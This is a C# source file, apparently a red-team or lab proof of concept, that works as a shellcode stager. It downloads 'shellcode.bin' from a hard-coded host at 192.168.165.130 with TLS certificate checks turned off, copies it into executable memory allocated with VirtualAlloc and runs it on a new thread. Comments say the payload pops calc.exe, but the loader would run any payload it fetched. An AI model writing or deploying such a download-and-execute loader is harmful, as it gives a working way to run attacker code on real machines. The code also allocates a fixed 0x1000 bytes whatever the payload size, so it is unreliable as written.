using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

public class Staged
{
    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds); private static uint MEM_COMMIT = 0x1000;
    private static uint PAGE_EXECUTE_READWRITE = 0x40;


   public static void Main()
    {


        string url = "https://192.168.165.130/shellcode.bin";
        Stager(url);
    }



    public static void Stager(string url)
    {
        WebClient wc = new WebClient();
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        byte[] shellcode = wc.DownloadData(url);

        Console.WriteLine("[+] Allocate memory in the current process");
        // Allocation of memory the size of the shellcode with COMMIT_RESERVE and EXECUTEREADWRITE permissions
        int size = shellcode.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Console.WriteLine("[+] Copying shellcode into allocated memory space");
        // Write shellcode into allocated memory space
        Marshal.Copy(shellcode, 0, addr, size);

        Console.WriteLine("[+] Creating thread and running...popping calc.exe");
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        // 0xFFFFFFFF = WAIT_FAILED
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
